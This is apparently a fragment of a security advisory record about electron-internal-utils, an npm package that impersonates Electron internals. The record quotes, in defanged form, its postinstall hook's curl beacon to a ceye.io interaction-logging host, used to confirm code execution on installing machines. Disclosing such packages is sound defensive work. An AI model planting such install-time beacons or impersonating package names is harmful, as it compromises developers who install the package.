  "summary": "Malicious code in electron-internal-utils (npm)",
  "details": "Postinstall hook in electron-internal-utils@1.0.0 executes 'curl hxxp://9ph8dp[.]ceye[.]io' — a beacon to ceye[.]io, an interactive HTTP/DNS interaction-logging service commonly used by attackers to verify remote code execution. The package contains no actual functionality (index.js is an empty stub). The package name impersonates Electron framework internal utilities to trick developers into installing it.",
